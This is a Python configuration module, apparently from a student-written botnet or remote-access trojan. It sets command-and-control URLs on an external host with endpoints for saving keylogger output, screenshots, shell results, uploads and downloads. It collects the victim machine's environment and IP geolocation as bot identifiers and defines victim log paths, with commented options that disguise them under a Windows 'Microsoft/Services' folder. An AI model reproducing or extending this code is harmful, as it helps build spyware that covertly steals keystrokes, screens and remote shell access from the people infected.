# -*- coding: utf-8 -*-
"""
Created on Mon Apr 25 00:24:43 2016

@author: abdelmajid
"""

import socket
import os

import localiser_ip


class Server:
    #URL="http://ffmer1ouaneaa.pythonanywhere.com/serviceapp/"
    URL="http://abdelmajid16.pythonanywhere.com/serviceapp/"
    #URL="http://127.0.0.1:8000/serviceapp/"
    URL_RECEPT=URL+"recept/"
    URL_GERERAGENT=URL+"gereragent/"
    URL_CMD_TERMINEE=URL+"commandeexecutee/"
    URL_KEYLOGGER_SAVE=URL+"savekeylogger/"
    URL_SCREENSHOT_SAVE=URL+"savescreenshot/"
    URL_SHELL_SAVE=URL+"saveshell/"
    URL_UPLOAD_SAVE=URL+"saveupload/"
    URL_DOWNLOAD_SAVE=URL+"savedownload/"


class System:
    """
    Classe regroupe les informations sur la machine et son systeme.
    """
    #-------**************----Windows----*****************-----
    #================ infos importants ======
    COMPUTERNAME = os.environ["COMPUTERNAME"] # NORUTU_AM
    USERDOMAIN = os.environ["USERDOMAIN"] # NORUTU_AM
    USERNAME = os.environ["USERNAME"] # abdelmajid
    PROCESSOR_IDENTIFIER = os.environ["PROCESSOR_IDENTIFIER"] # x86 Family 6 Model 15 Stepping 13, GenuineIntel
    PROCESSOR_REVISION = os.environ["PROCESSOR_REVISION"] # 0f0d
    PROCESSOR_ARCHITECTURE = os.environ["PROCESSOR_ARCHITECTURE"] # x86
    NUMBER_OF_PROCESSORS = os.environ["NUMBER_OF_PROCESSORS"] # 2
    PROCESSOR_LEVEL = os.environ["PROCESSOR_LEVEL"] # 6
    OS = os.environ["OS"] # Windows_NT

    r=os.popen("wmic os get osarchitecture")
    arch=r.read()
    r.close()
    arch=arch.split("\n")[1].strip()
    SYSTEM=OS+"/"+arch #Windows_NT/32-bits

    #================autres infos ===========
    TMP = os.environ["TMP"] # C:\Users\ABDELM~1\AppData\Local\Temp
    PSMODULEPATH = os.environ["PSMODULEPATH"] # C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
    COMMONPROGRAMFILES = os.environ["COMMONPROGRAMFILES"] # C:\Program Files\Common Files
    PROGRAMFILES = os.environ["PROGRAMFILES"] # C:\Program Files
    SYSTEMROOT = os.environ["SYSTEMROOT"] # C:\Windows
    PATH = os.environ["PATH"]#C:\Anaconda2\Library\bin;C:\Anaconda2;C:\Anaconda2\Scripts;;C:\ProgramData\Oracle\Java\javapath;C:\Windows\system32;C:\Windows\System32\WindowsPowerShell\v1.0\;
    TEMP = os.environ["TEMP"] # C:\Users\ABDELM~1\AppData\Local\Temp
    ALLUSERSPROFILE = os.environ["ALLUSERSPROFILE"] # C:\ProgramData
    SESSIONNAME = os.environ["SESSIONNAME"] # Console
    HOMEPATH = os.environ["HOMEPATH"] # \Users\abdelmajid
    LOGONSERVER = os.environ["LOGONSERVER"] # \\NORUTU_AM
    COMSPEC = os.environ["COMSPEC"] # C:\Windows\system32\cmd.exe
    PROGRAMDATA = os.environ["PROGRAMDATA"] # C:\ProgramData
    PATHEXT = os.environ["PATHEXT"] # .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.PY
    FP_NO_HOST_CHECK = os.environ["FP_NO_HOST_CHECK"] # NO
    WINDIR = os.environ["WINDIR"] # C:\Windows
    HOMEDRIVE = os.environ["HOMEDRIVE"] # C:
    APPDATA = os.environ["APPDATA"] # C:\Users\abdelmajid\AppData\Roaming
    SYSTEMDRIVE = os.environ["SYSTEMDRIVE"] # C:
    USERPROFILE = os.environ["USERPROFILE"] # C:\Users\abdelmajid
    PUBLIC = os.environ["PUBLIC"] # C:\Users\Public
    LOCALAPPDATA = os.environ["LOCALAPPDATA"] # C:\Users\abdelmajid\AppData\Local
#======================

class User:

    loc=localiser_ip.getLocalisation()
    host_name=socket.gethostname()# Noruto_AM

    IP_LOCAL=socket.gethostbyname(host_name)#192.168.1.21
    IP_INTER=loc['ip']
    BOT_PAYS=loc['pays']
    BOT_CONTENENT=loc['contenent']
    BOT_ID=-1#par default -1.
    #host_name+="/"+os.environ["USERNAME"] #Noruto_AM/abdelmajid

class Chemins:
    """
    Classe pour les chemins qu'on a besions de les contruire.
    """
    #=================Chemins pour les victimes======
    CHEMIN_INFOS_FILE="infos.log"#System.WINDIR+"/Microsoft/Services/infos.log"
    CHEMIN_CMDS_FILE="cmds.log"#System.WINDIR+"/Microsoft/Services/cmds.log"
    CHEMIN_KEYLOGGER_FILE="keys.log"#System.WINDIR+"/Microsoft/Services/keys.log"
    CHEMIN_SCREENSHOT_FILE="/screens"#System.WINDIR+"/Microsoft/Services/screens.log"
